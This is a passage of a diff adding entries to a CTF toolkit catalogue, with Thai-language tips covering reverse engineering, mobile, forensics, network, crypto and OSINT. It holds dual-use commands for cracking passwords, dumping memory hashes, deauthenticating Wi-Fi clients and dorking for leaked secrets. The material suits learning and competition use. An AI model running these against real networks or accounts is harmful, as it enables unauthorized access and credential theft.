+readelf -h chall
+readelf -s chall | head
+objdump -d -M intel chall | less
+ltrace ./chall
+strace -f ./chall
+
+# packed?
+upx -t chall
+upx -d chall -o unpacked
+
+# radare2/Cutter
+r2 -A chall
+aaa
+afl
+izz
+pdf @ main`},
+{label:'Ghidra / IDA workflow',body:`# 1. import binary
+# 2. analyze all
+# 3. find strings: flag, correct, wrong, password, key
+# 4. xrefs from interesting strings
+# 5. rename variables/functions
+# 6. identify compare/check function
+# 7. either patch jump or reimplement checker in Python
+
+# patch idea:
+# change JNZ/JNE to JZ/JE or NOP conditional branch
+# always test patched binary locally, never overwrite original`},
+{label:'Python reverse: pyc / PyInstaller',body:`# PyInstaller executable
+python3 pyinstxtractor.py challenge.exe
+cd challenge.exe_extracted
+find . -name "*.pyc" -o -name "*.py"
+
+# decompile pyc
+uncompyle6 file.pyc > file.py
+pycdc file.pyc > file.py
+python3 -m dis file.pyc
+
+# PyLingual online can help with newer Python versions
+# https://pylingual.io/
+
+# search extracted files
+grep -RaiE "flag|ctf|pico|password|secret|correct|wrong" .`},
+{label:'Java / Android reverse',body:`# JAR/class
+jar tf app.jar
+java -jar app.jar
+javap -c -p com.example.Main
+java -jar cfr.jar app.jar --outputdir cfr_out
+# open with JD-GUI / Bytecode Viewer
+
+# APK
+apktool d app.apk -o apk_out
+jadx -d jadx_out app.apk
+d2j-dex2jar app.apk -o app.jar
+grep -RaiE "flag|ctf|pico|secret|password|api|key" apk_out jadx_out
+
+# Android interesting files
+AndroidManifest.xml
+res/values/strings.xml
+assets/
+smali/
+classes.dex`},
+{label:'.NET reverse',body:`# Windows/.NET
+file challenge.exe
+strings -a challenge.exe | grep -iE "BSJB|#~|mscorlib|flag|password"
+
+# GUI tools
+# dnSpy: edit method, set breakpoint, patch IL, export
+# ILSpy: decompile and browse projects
+
+# CLI-ish
+ilspycmd -o ilspy_out challenge.exe
+grep -RaiE "flag|password|secret|correct|wrong" ilspy_out`},
+{label:'Dynamic bypass / patching',body:`# GDB patch at runtime
+gdb -q ./chall
+break *0x401234
+run
+set {char}0x401250 = 0x90
+set {char}0x401251 = 0x90
+continue
+
+# radare2 patch
+r2 -w chall
+aaa
+s 0x401250
+wa nop
+wq
+
+# Cheat Engine
+# Useful for Windows game/client memory challenges:
+# scan value -> change value -> freeze -> inspect code writes -> patch condition`}],
+tips:['เริ่มจาก strings และ xref ก่อนเข้า decompiler ลึก','Decompiler output ไม่จริง 100% ต้องยืนยันด้วย disassembly/dynamic run','PyInstaller มักมี pyc ที่ต้อง fix magic/header ตาม Python version','Jadx เหมาะกับ APK, JD-GUI/CFR เหมาะกับ JAR/class','UPX ลอง upx -d ก่อนเสียเวลา reverse packed code','dnSpy ยังมีประโยชน์มากกับ .NET เพราะ patch/debug ได้','ถ้า checker ซับซ้อน ให้ reimplement ใน Python หรือใช้ angr/z3','อย่าลืมดู resource/assets/config ไม่ใช่แค่ code'],
+checklistTitle:'Reverse 2025 checklist',
+checklist:['file/strings/binwalk/checksec ก่อนเปิด GUI','หา interesting strings และ xrefs','ระบุภาษา/packer/runtime: native, Python, Java, Android, .NET','unpack/decompile ด้วย tool ที่ตรง format','หา validate/check/compare function','ทำ dynamic debug เพื่อดู input/output จริง','patch branch หรือ reimplement algorithm','ค้น resource/assets/config/manifest','เขียน keygen/solver เมื่อเข้าใจ algorithm','เก็บ original binary และ patched binary แยกกัน'],
+},
+
+{cat:'ctf2025',name:'CTF 2025 Mobile Security Toolkit',url:'https://github.com/MobSF/Mobile-Security-Framework-MobSF',tags:['cli','java','python'],
+desc:'apktool, otool, adb, Genymotion, BlueStacks, Android Studio, MobSF สำหรับ mobile challenge',
+about:'Mobile category ปี 2025 เน้น Android APK เป็นหลัก และอาจมี iOS/Mach-O: apktool, otool, adb, Genymotion/Genemotion, BlueStacks, Android Studio และ MobSF ใช้ flow คือ unpack → manifest/strings/assets → jadx/smali → run emulator/device → adb logs/files → dynamic hooks/debug → extract flag',
+install:`sudo apt update
+sudo apt install -y adb apktool jadx dex2jar default-jdk
+python3 -m pip install frida-tools objection
+
+# Android Studio for SDK/emulator
+# Genymotion or BlueStacks for emulator
+# MobSF Docker
+docker pull opensecurity/mobile-security-framework-mobsf
+docker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest`,
+usage:[{label:'APK static analysis',body:`APK=challenge.apk
+file $APK
+apktool d $APK -o apk_out
+jadx -d jadx_out $APK
+d2j-dex2jar $APK -o app.jar
+
+# quick search
+grep -RaiE "flag|ctf|pico|secret|password|token|api|key|admin" apk_out jadx_out
+
+# important files
+cat apk_out/AndroidManifest.xml
+cat apk_out/res/values/strings.xml
+find apk_out/assets -type f -maxdepth 3
+find apk_out/res/raw -type f 2>/dev/null`},
+{label:'ADB dynamic basics',body:`adb devices
+adb install -r challenge.apk
+adb shell pm list packages | grep -i challenge
+adb shell monkey -p com.example.app 1
+adb logcat | grep -iE "flag|ctf|secret|error|exception"
+
+# pull app data if debuggable/rooted emulator
+adb shell run-as com.example.app ls -la
+adb shell run-as com.example.app cat files/flag.txt
+adb pull /sdcard/Download .
+
+# intents/activities
+adb shell dumpsys package com.example.app | grep -i Activity
+adb shell am start -n com.example.app/.MainActivity
+adb shell am start -a android.intent.action.VIEW -d "ctf://flag"`},
+{label:'MobSF workflow',body:`# Open http://127.0.0.1:8000
+# Upload APK
+# Review:
+# - Manifest: debuggable/exported activities
+# - Hardcoded secrets/API keys
+# - Insecure storage
+# - URLs/endpoints
+# - trackers/libraries
+# - certificate/pinning hints
+
+# Then confirm manually in jadx/apktool output`},
+{label:'Smali patch / rebuild',body:`# Edit smali condition or hardcoded value
+apktool d challenge.apk -o work_apk
+# edit work_apk/smali/.../*.smali
+apktool b work_apk -o patched.apk
+
+# sign
+keytool -genkey -v -keystore ctf.keystore -alias ctf -keyalg RSA -keysize 2048 -validity 10000
+apksigner sign --ks ctf.keystore patched.apk
+adb install -r patched.apk
+
+# common patch ideas
+# if-eqz -> if-nez
+# const/4 v0, 0x0 -> const/4 v0, 0x1
+# return false -> return true`},
+{label:'iOS / otool quick',body:`# Mach-O / IPA
+file app
+otool -L app
+otool -l app | head
+strings -a app | grep -iE "flag|ctf|secret|password|token"
+
+# IPA is ZIP
+unzip app.ipa -d ipa_out
+find ipa_out -type f | head
+grep -RaiE "flag|ctf|secret|password|token" ipa_out`}],
+tips:['Android flag มักอยู่ใน strings.xml, assets, raw resource, SQLite, SharedPreferences หรือ logcat','Jadx อ่าน Java/Kotlin ง่าย แต่ smali คือ source of truth','exported activity/deeplink มักเป็น shortcut ไป flag screen','ถ้า app debuggable ใช้ run-as ดึง files/shared_prefs ได้','MobSF เป็น scanner ช่วยเร็ว แต่ต้อง manual verify','BlueStacks/Genymotion ใช้เมื่อ Android Studio emulator หนักหรือไม่สะดวก','iOS IPA คือ zip; เริ่มจาก unzip + strings ก่อน','ถ้ามี root/pinning/frida detection ให้ patch smali หรือใช้ objection/frida'],
+checklistTitle:'Mobile 2025 checklist',
+checklist:['unpack ด้วย apktool และ decompile ด้วย jadx','อ่าน Manifest หา exported/debuggable/deeplink','grep strings/assets/res/raw/smali/jadx_out','ติดตั้งบน emulator และดู logcat','ลอง run-as/pull app data','ตรวจ SQLite/SharedPreferences/files/cache','ใช้ MobSF หา hardcoded secrets และ weak config','patch smali เมื่อมี client-side check','rebuild/sign/install patched APK','สำหรับ IPA ให้ unzip/strings/otool ก่อน'],
+},
+
+{cat:'ctf2025',name:'CTF 2025 Digital Forensics Toolkit',url:'https://www.sleuthkit.org/autopsy/',tags:['cli','python','online'],
+desc:'HxD, Autopsy, FTK, Volatility, binwalk, foremost, exiftool, 7Zip, strings/grep, Gimp, qpdf, John/hashcat/stego/audio tools',
+about:'Digital Forensics ปี 2025 รวม disk/file/memory/stego/audio/image/archive/password/registry workflow: HxD, Autopsy, FTK Imager, Volatility, Binwalk, Foremost, Exiftool, ALZip, 7Zip, Strings and Grep, Gimp, File, Recuva, QPDF, FCrackzip, CrackStation, ARCHPR, mmls, fls, iCat, srch_strings, ZIP File Password Recovery, Stegseek, Stego ToolKit, AperiSolve, Hashcat/GUI, JohnTheRipper, QSSTV, Audacity, Sonic Visualizer, Steghide, Stegsolve, MP3Stego, OpenStego, Zsteg, Jsteg, OpenPuff, Registry Viewer, Gary Kessler File Signature, DTMF Decoder, Powershell Deobfuscation, VirusTotal และ FotoForensic',
+install:`sudo apt update
+sudo apt install -y file binwalk foremost exiftool p7zip-full unzip zip fcrackzip john hashcat steghide zsteg audacity sox sleuthkit qpdf poppler-utils
+sudo apt install -y volatility3 autopsy testdisk scalpel pngcheck ffmpeg
+python3 -m pip install oletools pillow numpy scipy
+
+# GUI/online:
+# HxD, FTK Imager, Autopsy, Gimp, Recuva, Registry Viewer, Stegsolve.jar
+# AperiSolve, CrackStation, passwordrecovery.io, VirusTotal, FotoForensic, Gary Kessler signatures`,
+usage:[{label:'File triage',body:`file challenge
+file -k challenge
+xxd -g 1 -l 128 challenge
+tail -c 128 challenge | xxd -g 1
+strings -a challenge | grep -aiE "flag|ctf|pico|password|secret"
+strings -a -el challenge | grep -aiE "flag|ctf|pico|password|secret"
+exiftool challenge
+binwalk challenge
+binwalk -e challenge
+foremost -i challenge -o foremost_out
+
+# HxD/hex editor: check magic bytes, repair headers, carve by offset
+# Gary Kessler File Signature: identify true file type by header/footer`},
+{label:'Archives / password cracking',body:`# 7Zip / ALZip style extraction
+7z l archive
+7z x archive -oout
+unzip -l archive.zip
+unzip archive.zip -d out
+
+# ZIP cracking
+zip2john protected.zip > zip.hash
+john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt
+fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt protected.zip
+hashcat -m 17200 zip.hash /usr/share/wordlists/rockyou.txt
+
+# Online fallback
+# CrackStation for hashes
+# passwordrecovery.io for ZIP file password recovery
+# ARCHPR/Advanced Archive Password Recovery if allowed in local Windows setup`},
+{label:'Disk image forensics',body:`IMG=disk.img
+file $IMG
+mmls $IMG
+fsstat -o OFFSET $IMG
+fls -o OFFSET -r $IMG | tee fls.txt
+icat -o OFFSET $IMG INODE > recovered_file
+tsk_recover -o OFFSET $IMG recovered_dir
+srch_strings -a $IMG | grep -aiE "flag|ctf|pico|password|secret"
+
+# Autopsy / FTK Imager
+# 1. add image
+# 2. inspect partitions/files/deleted files
+# 3. export suspicious files
+# 4. timeline/recent docs/browser artifacts
+
+# Recuva: useful for simple deleted-file recovery on local removable media`},
+{label:'Memory forensics',body:`MEM=memory.raw
+vol -f $MEM windows.info
+vol -f $MEM windows.pslist
+vol -f $MEM windows.pstree
+vol -f $MEM windows.cmdline
+vol -f $MEM windows.filescan | grep -aiE "flag|secret|Desktop|Downloads"
+vol -f $MEM -o out windows.dumpfiles --filter ".*flag.*" --ignore-case
+vol -f $MEM windows.netscan
+vol -f $MEM windows.registry.hivelist
+vol -f $MEM windows.registry.hashdump
+
+# quick strings
+strings -a $MEM | grep -aiE "flag|pico|ctf|password|secret"
+strings -a -el $MEM | grep -aiE "flag|pico|ctf|password|secret"`},
+{label:'Image/stego workflow',body:`IMG=image.png
+file $IMG
+exiftool $IMG
+zsteg -a $IMG
+binwalk -e $IMG
+steghide info $IMG
+steghide extract -sf $IMG
+stegseek $IMG /usr/share/wordlists/rockyou.txt
+java -jar stegsolve.jar
+
+# online/image tools
+# AperiSolve: run many stego checks
+# FotoForensic: ELA/noise/metadata visual checks
+# Gimp/Photoshop: levels, channels, contrast, bit planes
+# OpenStego/OpenPuff/MP3Stego/Jsteg depending on format`},
+{label:'Audio/radio forensics',body:`AUDIO=message.wav
+file $AUDIO
+exiftool $AUDIO
+soxi $AUDIO
+audacity $AUDIO
+sonic-visualiser $AUDIO
+sox $AUDIO -n spectrogram -o spectrogram.png
+strings -a $AUDIO | grep -aiE "flag|ctf|pico"
+
+# SSTV
+# QSSTV: play audio into virtual cable or open WAV if supported
+
+# DTMF
+# use online DTMF Decoder or multimon-ng:
+multimon-ng -a DTMF -t wav $AUDIO
+
+# Morse
+sox $AUDIO -n stat
+# inspect waveform/spectrogram manually`},
+{label:'PDF/Office/PowerShell',body:`# PDF
+pdfinfo file.pdf
+qpdf --check file.pdf
+qpdf --repair file.pdf fixed.pdf
+pdfimages -all file.pdf pdf_img
+strings -a file.pdf | grep -aiE "flag|ctf|pico|password|secret"
+
+# Office/macro
+oleid suspicious.docm
+olevba suspicious.docm
+7z x suspicious.docx -ooffice_out
+grep -RaiE "flag|ctf|pico|password|secret" office_out
+
+# PowerShell deobfuscation
+cat script.ps1
+grep -oE "FromBase64String\\('[A-Za-z0-9+/=]+'" script.ps1
+pwsh -NoProfile
+# decode Base64, replace IEX with Write-Output, inspect strings before running`},
+{label:'VirusTotal / registry artifacts',body:`# VirusTotal
+# Upload hash/file only if challenge rules allow.
+# Prefer hash lookup first:
+sha256sum suspicious.exe
+
+# Registry Viewer / hives
+# Load NTUSER.DAT, SOFTWARE, SYSTEM, SAM
+# Check Run keys, UserAssist, RecentDocs, TypedPaths, USBStor, ShimCache/AmCache
+
+# CLI with regripper if available
+rip.pl -r NTUSER.DAT -p userassist
+rip.pl -r SOFTWARE -p run
+rip.pl -r SYSTEM -p usbstor`}],
+tips:['Forensics เริ่มจาก file/xxd/strings/exiftool/binwalk เสมอ','อย่าแก้ original ให้ทำสำเนาก่อนทุกครั้ง','ถ้าเจอ archive ให้ list ก่อน extract เพื่อดู path traversal/hidden files','Memory dump ให้หา flag ด้วย strings ASCII + UTF-16LE ก่อน Volatility ลึก','Stego รูปให้เช็ค metadata, appended files, LSB, channels, palette, alpha','Audio ให้ดู spectrogram ก่อน หลายโจทย์ซ่อนรูป/ข้อความในความถี่','Disk image ใช้ mmls หา offset ก่อน fls/icat','VirusTotal อาจ leak challenge file ถ้า upload; ใช้ hash lookup เมื่อระวัง'],
+checklistTitle:'Forensics 2025 checklist',
+checklist:['identify format จริงด้วย magic/header','strings/grep flag ทั้ง ASCII และ UTF-16LE','binwalk/foremost/scalpel carve ไฟล์ซ้อน','exiftool metadata ทุกไฟล์ media/doc','ถ้า archive มีรหัสให้ใช้ john/fcrackzip/hashcat','disk image ใช้ mmls/fls/icat/tsk_recover','memory ใช้ Volatility process/files/registry/network','stego ใช้ zsteg/stegsolve/steghide/stegseek/AperiSolve','audio ใช้ Audacity/Sonic Visualizer/spectrogram/QSSTV/DTMF','บันทึก hash/offset/เครื่องมือที่ใช้เพื่อย้อนรอย'],
+},
+
+{cat:'ctf2025',name:'CTF 2025 Network Security Toolkit',url:'https://www.wireshark.org/',tags:['cli'],
+desc:'Wireshark, tshark, Brim, NetworkMiner, tcpdump, Aircrack-ng, Acrylic Wi-Fi Analyzer',
+about:'Network Security ปี 2025 เน้น packet analysis, file extraction, credentials, wireless capture และ timeline: Wireshark, Tshark, Brim/Zeek, NetworkMiner, Tcpdump, Aircrack-ng และ Acrylic Wi-Fi Analyzer',
+install:`sudo apt update
+sudo apt install -y wireshark tshark tcpdump aircrack-ng zeek network-manager
+
+# Brim is now often distributed as a Zeek/Zui workflow depending on version.
+# NetworkMiner and Acrylic Wi-Fi Analyzer are common Windows GUI tools.`,
+usage:[{label:'PCAP first pass',body:`PCAP=capture.pcapng
+file $PCAP
+capinfos $PCAP
+tshark -r $PCAP -q -z io,phs
+tshark -r $PCAP -q -z conv,tcp
+tshark -r $PCAP -q -z conv,udp
+tshark -r $PCAP -T fields -e frame.number -e ip.src -e ip.dst -e _ws.col.Protocol -e _ws.col.Info | head
+
+# quick flag search
+tshark -r $PCAP -Y 'frame contains "flag" or frame contains "pico" or frame contains "ctf"'
+strings -a $PCAP | grep -aiE "flag|pico|ctf|password|secret"`},
+{label:'Wireshark filters',body:`http
+http.request
+http.request.method == "POST"
+http contains "flag"
+tcp.stream eq 0
+dns
+ftp || ftp-data
+smtp || pop || imap
+tls
+ip.addr == 10.0.0.5
+tcp.port == 80
+frame contains "password"
+urlencoded-form`},
+{label:'Tshark extraction',body:`# HTTP objects
+mkdir -p http_objects
+tshark -r $PCAP --export-objects http,http_objects
+
+# Follow streams
+tshark -r $PCAP -q -z follow,tcp,ascii,0
+tshark -r $PCAP -q -z follow,udp,ascii,0
+
+# URLs / hosts / DNS
+tshark -r $PCAP -Y http.request -T fields -e http.host -e http.request.uri
+tshark -r $PCAP -Y dns.qry.name -T fields -e dns.qry.name | sort -u
+
+# credentials-ish
+tshark -r $PCAP -Y 'http.request.method == "POST"' -T fields -e frame.number -e http.file_data
+tshark -r $PCAP -Y ftp.request.command -T fields -e ftp.request.command -e ftp.request.arg`},
+{label:'Tcpdump capture/filters',body:`# live capture
+sudo tcpdump -i any -nn -w capture.pcap
+sudo tcpdump -i eth0 host 10.10.10.10 -w host.pcap
+sudo tcpdump -i eth0 port 80 -A
+sudo tcpdump -r capture.pcap -nn
+sudo tcpdump -r capture.pcap -A 'tcp port 80'
+
+# split large pcap
+editcap -c 10000 big.pcap split.pcap
+editcap -A "2025-01-01 00:00:00" -B "2025-01-01 01:00:00" big.pcap slice.pcap`},
+{label:'Brim/Zeek + NetworkMiner',body:`# Zeek logs
+zeek -r capture.pcap
+ls *.log
+cat conn.log | zeek-cut id.orig_h id.resp_h id.resp_p proto service duration
+cat http.log | zeek-cut host uri user_agent
+cat dns.log | zeek-cut query answers
+cat files.log | zeek-cut fuid mime_type filename extracted
+
+# Brim/Zui
+# import pcap -> inspect connections, DNS, HTTP, files timeline
+
+# NetworkMiner
+# open pcap -> Hosts, Files, Images, Credentials tabs
+# export files/images and grep for flag`},
+{label:'Wireless / Aircrack-ng',body:`# monitor mode
+airmon-ng check kill
+airmon-ng start wlan0
+airodump-ng wlan0mon
+airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w capture wlan0mon
+
+# deauth for handshake when allowed
+aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon
+
+# crack WPA handshake
+aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
+
+# Acrylic Wi-Fi Analyzer: Windows GUI for channel/AP/client inspection`}],
+tips:['Wireshark Follow TCP Stream คือทางลัดที่เร็วมากใน CTF','tshark ดีสำหรับ grep/export ซ้ำๆ และทำ report','NetworkMiner เหมาะกับ export files/images/credentials จาก pcap','Brim/Zeek เหมาะกับ pcap ใหญ่และ timeline','DNS query อาจ encode flag เป็น subdomains','HTTP POST มักมี credentials/flag submission','ถ้า TLS encrypted ให้หา key log, cert, SNI, DNS, JA3, metadata แทน','Wireless ต้องระวังกติกาและอุปกรณ์สนาม'],
+checklistTitle:'Network 2025 checklist',
+checklist:['capinfos และ protocol hierarchy ก่อน','หา conversations/top talkers','grep frame contains flag/password/secret','ตรวจ DNS, HTTP, FTP, SMTP, SMB, ICMP','export objects/files/images','follow TCP/UDP streams สำคัญ','ใช้ Zeek/Brim สำหรับ timeline/pcap ใหญ่','ใช้ NetworkMiner เพื่อดู credentials/files เร็ว','wireless ตรวจ handshake, SSID, BSSID, channel','เก็บ extracted files ไปต่อด้วย forensics/stego'],
+},
+
+{cat:'ctf2025',name:'CTF 2025 Cryptography Toolkit',url:'https://gchq.github.io/CyberChef/',tags:['online','python','cli'],
+desc:'CyberChef, dCode, Ciphey, John, OpenSSL, CrypTool, RsaCtfTool, QuipQuip, BrainFuck, JSFuck, SageMath, XRSA',
+about:'Cryptography ปี 2025 รวม classical, encoding, hashing, RSA, weird languages และ brute force: CyberChef, dCode.fr, Ciphey, JohnTheRipper, OpenSSL, CrypTool, RsaCtfTool.py, QuipQuip, BrainFuck, JSFuck, XRSA, SageMath, Malbolge, Enigmator, Spamimic, Twitter Secret Message และ Solve Crypto with Force',
+install:`sudo apt update
+sudo apt install -y openssl john hashcat sagemath python3-pip
+python3 -m pip install ciphey pycryptodome gmpy2 sympy z3-solver primefac factordb-pycli
+git clone https://github.com/RsaCtfTool/RsaCtfTool.git tools/RsaCtfTool
+
+# Online:
+# CyberChef, dCode.fr, QuipQuip, CrypTool, SageCell, Enigmator, Spamimic, Twitter Secret Message`,
+usage:[{label:'Encoding triage',body:`# CyberChef Magic first
+# Try: From Base64, From Hex, From Binary, URL Decode, ROT13, XOR Brute Force, Magic
+
+# CLI quick checks
+echo "$DATA" | base64 -d
+echo "$DATA" | xxd -r -p
+python3 - <<'PY'
+import base64, binascii
+s=b'...'
+for f in (base64.b64decode, base64.b32decode, base64.b85decode):
+    try: print(f.__name__, f(s))
+    except Exception: pass
+PY
+
+# Ciphey auto decode
+ciphey -t "encoded text"
+ciphey -f cipher.txt`},
+{label:'Classical cipher tools',body:`# dCode.fr:
+# Caesar, Vigenere, Affine, Bacon, Playfair, Rail Fence, Morse, ADFGX, Enigma
+
+# QuipQuip for substitution
+# Paste ciphertext and solve simple substitution/homophonic-ish text
+
+# Enigmator for Enigma settings challenge
+# CrypTool for visual/classical workflows
+
+# Frequency quick
+python3 - <<'PY'
+from collections import Counter
+s=open('cipher.txt','rb').read().lower()
+print(Counter([c for c in s if 97 <= c <= 122]).most_common())
+PY`},
+{label:'Hashes / John / Hashcat / CrackStation',body:`hashid hash.txt
+haiti '5f4dcc3b5aa765d61d8327deb882cf99'
+
+# John
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+john --show hash.txt
+
+# Hashcat examples
+hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt      # MD5
+hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt   # NTLM
+hashcat -m 1400 hash.txt /usr/share/wordlists/rockyou.txt   # SHA256
+
+# CrackStation online: fast for common unsalted hashes`},
+{label:'OpenSSL practical commands',body:`# inspect cert/key
+openssl x509 -in cert.pem -text -noout
+openssl rsa -in key.pem -text -noout
+openssl pkey -in key.pem -text -noout
+
+# encrypt/decrypt common CTF
+openssl enc -d -aes-256-cbc -in enc.bin -out dec.bin -k password
+openssl enc -d -aes-128-ecb -in enc.bin -out dec.bin -K HEXKEY
+openssl rsautl -decrypt -inkey private.pem -in cipher.bin -out plain.bin
+openssl pkeyutl -decrypt -inkey private.pem -in cipher.bin -out plain.bin
+
+# hashes/HMAC
+openssl dgst -sha256 file
+openssl dgst -sha256 -hmac secret file`},
+{label:'RSA attacks',body:`# RsaCtfTool
+python3 tools/RsaCtfTool/RsaCtfTool.py --publickey pub.pem --uncipherfile cipher.bin
+python3 tools/RsaCtfTool/RsaCtfTool.py -n N -e E --uncipher C
+python3 tools/RsaCtfTool/RsaCtfTool.py --publickey pub.pem --private
+
+# FactorDB / SageMath
+sage
+factor(N)
+
+# common RSA weaknesses
+# small e broadcast
+# common modulus
+# close primes / Fermat
+# leaked p/q/d/phi
+# dp/dq/qinv CRT leaks
+# no padding textbook RSA
+# Wiener when d is small`},
+{label:'Weird languages / esolang',body:`# BrainFuck
+# dCode Brainfuck interpreter or local:
+python3 - <<'PY'
+# use online if fast; local interpreter snippets are easy to find
+print('BrainFuck: look for +-><.,[] alphabet')
+PY
+
+# JSFuck
+# pattern: []()!+
+# run safely in isolated browser/node if challenge-owned
+node jsfuck.js
+
+# Malbolge
+# use online Malbolge interpreter
+
+# Spamimic / Twitter Secret Message
+# use online decoders; look for spam-looking paragraph or tweet-like hidden text
+
+# Solve Crypto with Force
+# brute Caesar/XOR/small keys and score English/flag format`}],
+tips:['Crypto เริ่มจาก identify encoding ก่อน อย่ากระโดดไป RSA ทันที','CyberChef Magic ช่วยหา layer ง่ายๆ แต่ควร verify recipe เอง','dCode ดีมากกับ classical ciphers และ weird encodings','Ciphey ใช้เป็น quick guess ไม่ใช่ proof','RSA ต้องรวบรวม n,e,c,p,q,d,phi ให้ครบก่อนเลือก attack','Hash cracking ต้องรู้ hash mode และ salt format','OpenSSL command syntax เปลี่ยนตาม version ระวัง rsautl deprecated','ถ้าเห็น BrainFuck/JSFuck/Malbolge ให้ใช้ interpreter เฉพาะทาง ไม่ต้อง manual'],
+checklistTitle:'Crypto 2025 checklist',
+checklist:['ดู alphabet/charset/length/padding ก่อน','ลอง CyberChef Magic และ basic decoders','หา flag format หลัง decode ทุกชั้น','แยก hash vs encryption vs encoding','classical cipher ใช้ dCode/QuipQuip/frequency','RSA ใช้ RsaCtfTool/FactorDB/SageMath','hash ใช้ John/Hashcat/CrackStation','OpenSSL สำหรับ cert/key/AES/RSA files','weird language ใช้ interpreter เฉพาะ','เขียน solver เมื่อมี oracle/protocol/bruteforce'],
+},
+
+{cat:'ctf2025',name:'CTF 2025 Misc / OSINT / Blockchain Toolkit',url:'https://osintframework.com/',tags:['online','cli'],
+desc:'Photoshop, Audacity, OSINT Framework, Npiep, Sherlock, find/cat, zbarimg, Google/GitHub/StackOverflow, SQLite, Etherscan, Remix, Wayback, Namechk, Geohints, Wigle, Pic2map, Tor, What3Words',
+about:'Miscellaneous ปี 2025 รวมงานหลากหลาย: Photoshop, Fcrackzip, JohnTheRipper, Audacity, Sonic Visualiser, OSINT Framework, Npiep, Sherlock, find, cat, zbarimg, Google, GitHub, Stack Overflow, SQLite, DB Browser, Etherscan, Remix Smart Contract, Way Back Machine, Namechk, Geotag, Geohints, Wigle, Pic2map, Tor Browser, Hidden Wiki และ What3Words',
+install:`sudo apt update
+sudo apt install -y zbar-tools sqlite3 ffmpeg sox audacity exiftool torbrowser-launcher git python3-pip
+python3 -m pip install sherlock-project maigret holehe
+
+# GUI/online:
+# Photoshop/Gimp, Sonic Visualiser, DB Browser for SQLite
+# OSINT Framework, Google, GitHub, Stack Overflow, Etherscan, Remix, Wayback, Namechk, Geohints, Wigle, Pic2map, What3Words`,
+usage:[{label:'OSINT first pass',body:`# username search
+sherlock username
+maigret username
+holehe email@example.com
+
+# Google dorks
+site:target.com filetype:pdf
+site:target.com "password"
+site:github.com target.com "api_key"
+"exact phrase from challenge"
+
+# GitHub search
+org:target password
+filename:.env SECRET_KEY
+"flag{" language:Python
+
+# Wayback
+# https://web.archive.org/web/*/target.com/*
+waybackurls target.com | tee wayback.txt
+grep -iE "flag|admin|backup|api|token" wayback.txt`},
+{label:'Geo / image OSINT',body:`# metadata
+exiftool image.jpg
+exiftool -gpslatitude -gpslongitude image.jpg
+
+# Pic2map / Geotag
+# Upload/check EXIF GPS if allowed by challenge
+
+# Geohints
+# Use country clues: road signs, bollards, lane markings, license plates
+
+# Wigle
+# Search BSSID/SSID from Wi-Fi screenshot or pcap
+
+# What3Words
+# Convert 3-word address to coordinates and inspect map clue`},
+{label:'QR / barcode / local files',body:`# zbarimg
+zbarimg qr.png
+zbarimg --raw qr.png
+
+# find / cat basics
+find . -type f
+find . -type f -name "*flag*"
+find . -type f -exec file {} \\;
+grep -RaiE "flag|ctf|pico|password|secret" .
+cat file.txt
+
+# Npiep
+# If challenge references Npiep, treat as misc/network/helper clue; inspect docs/name/context in challenge files.`},
+{label:'SQLite / DB Browser',body:`sqlite3 database.db ".tables"
+sqlite3 database.db ".schema"
+sqlite3 database.db "SELECT name FROM sqlite_master WHERE type='table';"
+sqlite3 database.db "SELECT * FROM users LIMIT 10;"
+sqlite3 database.db ".dump" > dump.sql
+grep -aiE "flag|ctf|pico|password|secret" dump.sql
+
+# DB Browser for SQLite:
+# open DB -> Browse Data -> Execute SQL -> export table`},
+{label:'Blockchain / smart contract',body:`# Etherscan
+# Search address / tx hash / contract
+# Check Contract tab, Read Contract, Write Contract, Events, Internal Txns
+
+# Foundry/cast quick if installed
+cast call CONTRACT "owner()(address)" --rpc-url RPC
+cast storage CONTRACT 0 --rpc-url RPC
+
+# Remix
+# paste Solidity source -> compile same version -> deploy/attach at address
+# inspect public variables, owner checks, require statements
+
+# common CTF ideas
+# private variables are public on-chain via storage
+# weak randomness block.timestamp/blockhash
+# unchecked arithmetic in old Solidity
+# tx.origin auth
+# reentrancy / delegatecall / selfdestruct`},
+{label:'Tor / hidden services safety',body:`# Tor Browser
+# Use only challenge-provided .onion links.
+# Do not log into personal accounts.
+# Do not download/run unknown binaries outside sandbox.
+
+# Hidden Wiki
+# Not an authoritative source; for CTF use only when challenge explicitly points there.
+
+# Basic opsec for CTF:
+# isolate browser profile
+# keep notes of URLs and timestamps
+# never reuse personal credentials`}],
+tips:['Misc มักต้อง combine หลายหมวด เช่น QR -> URL -> Wayback -> GitHub secret','OSINT ให้จด source URL ทุกครั้ง เพราะกลับไป verify ง่าย','Google/GitHub search ใช้ quote exact strings จากโจทย์','EXIF อาจถูกลบ แต่ภาพยังมี visual geo clues','SQLite flag มักอยู่ใน deleted rows/dump/hidden table ชื่อแปลก','Etherscan storage อ่านได้แม้ตัวแปร private','Tor/Hidden Wiki ใช้เฉพาะโจทย์อนุญาตและอย่าโหลดไฟล์สุ่ม','Photoshop/Gimp ใช้ปรับ levels/channels เหมือน forensic image workflow'],
+checklistTitle:'Misc/OSINT 2025 checklist',
+checklist:['อ่านโจทย์หา exact phrase, username, email, domain, image, address','ค้น Google/GitHub/Wayback ด้วย exact strings','ใช้ OSINT Framework เลือก tool ตาม artifact','ใช้ Sherlock/Namechk/Maigret กับ username','ตรวจ EXIF/GPS แล้วต่อด้วย Geohints/Wigle/Pic2map','สแกน QR/barcode ด้วย zbarimg','เปิด SQLite ด้วย sqlite3/DB Browser แล้ว dump grep','ตรวจ smart contract บน Etherscan/Remix/storage','ใช้ audio/image tools จาก Forensics เมื่อเป็น media misc','บันทึกหลักฐานและ URL ที่นำไปสู่ flag'],
+},
+
+{cat:'ctf2025',name:'PDF Notes — CTF Field Guide & Methodology',tags:['online','cli'],
+desc:'สรุปแก่นจาก ctf_security.pdf, CTF_Forensic_v1.pdf, CTF_Workshop_v2: วิธีคิด CTF, flag format, lab setup, playbook',
